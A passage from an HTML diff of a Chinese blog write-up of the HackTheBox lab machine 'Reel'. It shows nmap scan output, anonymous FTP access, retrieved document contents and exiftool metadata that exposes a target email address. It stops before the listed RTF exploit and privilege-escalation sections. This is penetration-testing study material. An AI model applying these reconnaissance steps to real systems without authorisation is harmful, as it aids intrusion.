@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Reel - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="HackTheBox">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;143  10.10.10.77  端口扫描12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Reel - HackTheBox">
+<meta property="og:url" content="https://darkwing.moe/2020/11/17/Reel-HackTheBox/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;143  10.10.10.77  端口扫描12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111701.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111702.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111703.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111704.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111705.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111706.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111707.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111708.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111709.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111710.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111711.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111712.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111713.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111714.jpg">
+<meta property="article:published_time" content="2020-11-17T07:41:59.000Z">
+<meta property="article:modified_time" content="2020-11-17T07:42:46.936Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111701.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.weibo.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                彼女募集中
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://darkwing.moe/2015/01/01/%E4%B9%A6%E5%8D%95/"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Reel - HackTheBox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Reel - HackTheBox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-11-17T07:41:59.000Z" itemprop="datePublished" class="page-time">
+  2020-11-17
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#10-10-10-77"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">10.10.10.77</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#FTP"><span class="post-toc-number">3.</span> <span class="post-toc-text">FTP</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#AppLocker-docx"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">AppLocker.docx</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#readme-txt"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">readme.txt</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Windows-Event-Forwarding-docx"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">Windows Event Forwarding.docx</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SMTP"><span class="post-toc-number">4.</span> <span class="post-toc-text">SMTP</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#smtp-user-enum"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">smtp-user-enum</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#users-txt"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">users.txt</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#RTF-vuln"><span class="post-toc-number">5.</span> <span class="post-toc-text">RTF vuln</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#生成hta"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">生成hta</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#生成RTF"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">生成RTF</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sendemail-amp-amp-getshell"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">sendemail &amp;&amp; getshell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#msf一键"><span class="post-toc-number">5.4.</span> <span class="post-toc-text">msf一键</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">6.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#nico-to-tom"><span class="post-toc-number">7.</span> <span class="post-toc-text">nico to tom</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#cred-xml"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">cred.xml</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#creds"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">creds</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ssh"><span class="post-toc-number">7.3.</span> <span class="post-toc-text">ssh</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权信息"><span class="post-toc-number">8.</span> <span class="post-toc-text">提权信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#groups"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">groups</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#note-txt"><span class="post-toc-number">8.2.</span> <span class="post-toc-text">note.txt</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#BloodHound"><span class="post-toc-number">9.</span> <span class="post-toc-text">BloodHound</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#tom-to-claire"><span class="post-toc-number">10.</span> <span class="post-toc-text">tom to claire</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#claire-to-Backup-Admins"><span class="post-toc-number">11.</span> <span class="post-toc-text">claire to Backup_Admins</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Backup-Admins-to-Administrator"><span class="post-toc-number">12.</span> <span class="post-toc-text">Backup_Admins to Administrator</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Backup-Scripts"><span class="post-toc-number">12.1.</span> <span class="post-toc-text">Backup Scripts</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root-flag"><span class="post-toc-number">13.</span> <span class="post-toc-text">root flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">14.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Reel-HackTheBox"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Reel - HackTheBox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-11-17 15:41:59" datetime="2020-11-17T07:41:59.000Z"  itemprop="datePublished">2020-11-17</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
+<li><p><a href="https://www.hackthebox.eu/home/machines/profile/143" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/143</a></p>
+</li>
+<li><h2 id="10-10-10-77"><a href="#10-10-10-77" class="headerlink" title="10.10.10.77"></a>10.10.10.77</h2></li>
+</ul>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.10.77</span></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-17 13:47 CST</span><br><span class="line">Nmap scan report for 10.10.10.77</span><br><span class="line">Host is up (0.068s latency).</span><br><span class="line">Not shown: 992 filtered ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">21/tcp    open  ftp          Microsoft ftpd</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_05-28-18  11:19PM       &lt;DIR&gt;          documents</span><br><span class="line">| ftp-syst:</span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)</span><br><span class="line">|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)</span><br><span class="line">|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)</span><br><span class="line">25/tcp    open  smtp?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|   Hello:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     EHLO Invalid domain address.</span><br><span class="line">|   Help:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">|   SIPOptions:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|   TerminalServerCookie:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|_    sequence of commands</span><br><span class="line">| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP,</span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49159/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port25-TCP:V=7.91%I=7%D=11/17%Time=5FB36420%P=x86_64-apple-darwin19.6.0</span><br><span class="line">SF:%r(NULL,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Ma</span><br><span class="line">SF:il\x20Service\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.</span><br><span class="line">SF:\r\n")%r(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HEL</span><br><span class="line">SF:O\x20EHLO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VR</span><br><span class="line">SF:FY\r\n")%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20B</span><br><span class="line">SF:ad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20com</span><br><span class="line">SF:mands\r\n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20</span><br><span class="line">SF:Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20co</span><br><span class="line">SF:mmands\r\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x</span><br><span class="line">SF:20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20</span><br><span class="line">SF:commands\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503</span><br><span class="line">SF:\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x</span><br><span class="line">SF:20commands\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r</span><br><span class="line">SF:(DNSVersionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSSt</span><br><span class="line">SF:atusRequestTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionRe</span><br><span class="line">SF:q,18,"220\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"</span><br><span class="line">SF:220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20comm</span><br><span class="line">SF:ands\r\n")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(</span><br><span class="line">SF:Kerberos,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220</span><br><span class="line">SF:\x20Mail\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Servic</span><br><span class="line">SF:e\x20ready\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20read</span><br><span class="line">SF:y\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence</span><br><span class="line">SF:\x20of\x20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20read</span><br><span class="line">SF:y\r\n")%r(LDAPSearchReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(LDA</span><br><span class="line">SF:PBindReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SIPOptions,162,"22</span><br><span class="line">SF:0\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20comman</span><br><span class="line">SF:ds\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequenc</span><br><span class="line">SF:e\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\</span><br><span class="line">SF:x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x2</span><br><span class="line">SF:0commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20</span><br><span class="line">SF:sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\</span><br><span class="line">SF:r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x</span><br><span class="line">SF:20of\x20commands\r\n");</span><br><span class="line">Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1s, deviation: 2s, median: 0s</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2012::-</span><br><span class="line">|   Computer name: REEL</span><br><span class="line">|   NetBIOS computer name: REEL\x00</span><br><span class="line">|   Domain name: HTB.LOCAL</span><br><span class="line">|   Forest name: HTB.LOCAL</span><br><span class="line">|   FQDN: REEL.HTB.LOCAL</span><br><span class="line">|_  System time: 2020-11-17T05:51:01+00:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2020-11-17T05:50:58</span><br><span class="line">|_  start_date: 2020-11-17T05:44:17</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 251.10 seconds</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><p>ftp可以匿名访问：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111701.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111702.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="AppLocker-docx"><a href="#AppLocker-docx" class="headerlink" title="AppLocker.docx"></a>AppLocker.docx</h2><p>里面就一句话：</p>
+<blockquote>
+<p>AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.</p>
+</blockquote>
+<h2 id="readme-txt"><a href="#readme-txt" class="headerlink" title="readme.txt"></a>readme.txt</h2><p>也是很少的内容：</p>
+<blockquote>
+<p>please email me any rtf format procedures - I’ll review and convert.</p>
+<p>new format / converted documents will be saved here.</p>
+</blockquote>
+<h2 id="Windows-Event-Forwarding-docx"><a href="#Windows-Event-Forwarding-docx" class="headerlink" title="Windows Event Forwarding.docx"></a>Windows Event Forwarding.docx</h2><p>是一些日志信息，在元数据中得到一个邮箱地址 <a href="mailto:nico@megabank.com">nico@megabank.com</a> :</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> exiftool Windows\ Event\ Forwarding.docx</span></span><br><span class="line">ExifTool Version Number         : 12.00</span><br><span class="line">File Name                       : Windows Event Forwarding.docx</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 14 kB</span><br><span class="line">File Modification Date/Time     : 2020:11:17 13:51:41+08:00</span><br><span class="line">File Access Date/Time           : 2020:11:17 13:52:20+08:00</span><br><span class="line">File Inode Change Date/Time     : 2020:11:17 13:55:59+08:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : DOCX</span><br><span class="line">File Type Extension             : docx</span><br><span class="line">MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document</span><br><span class="line">Zip Required Version            : 20</span><br><span class="line">Zip Bit Flag                    : 0x0006</span><br><span class="line">Zip Compression                 : Deflated</span><br><span class="line">Zip Modify Date                 : 1980:01:01 00:00:00</span><br><span class="line">Zip CRC                         : 0x82872409</span><br><span class="line">Zip Compressed Size             : 385</span><br><span class="line">Zip Uncompressed Size           : 1422</span><br><span class="line">Zip File Name                   : [Content_Types].xml</span><br><span class="line">Creator                         : nico@megabank.com</span><br><span class="line">Revision Number                 : 4</span><br><span class="line">Create Date                     : 2017:10:31 18:42:00Z</span><br><span class="line">Modify Date                     : 2017:10:31 18:51:00Z</span><br><span class="line">Template                        : Normal.dotm</span><br><span class="line">Total Edit Time                 : 5 minutes</span><br><span class="line">Pages                           : 2</span><br><span class="line">Words                           : 299</span><br><span class="line">Characters                      : 1709</span><br><span class="line">Application                     : Microsoft Office Word</span><br><span class="line">Doc Security                    : None</span><br><span class="line">Lines                           : 14</span><br><span class="line">Paragraphs                      : 4</span><br><span class="line">Scale Crop                      : No</span><br><span class="line">Heading Pairs                   : Title, 1</span><br><span class="line">Titles Of Parts                 :</span><br><span class="line">Company                         :</span><br><span class="line">Links Up To Date                : No</span><br><span class="line">Characters With Spaces          : 2004</span><br><span class="line">Shared Doc                      : No</span><br><span class="line">Hyperlinks Changed              : No</span><br><span class="line">App Version                     : 14.0000</span><br></pre></td></tr></table></figure>
+
+<h1 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h1><p>就是手工尝试发现接受任意reel.htb邮箱，然后进行枚举</p>
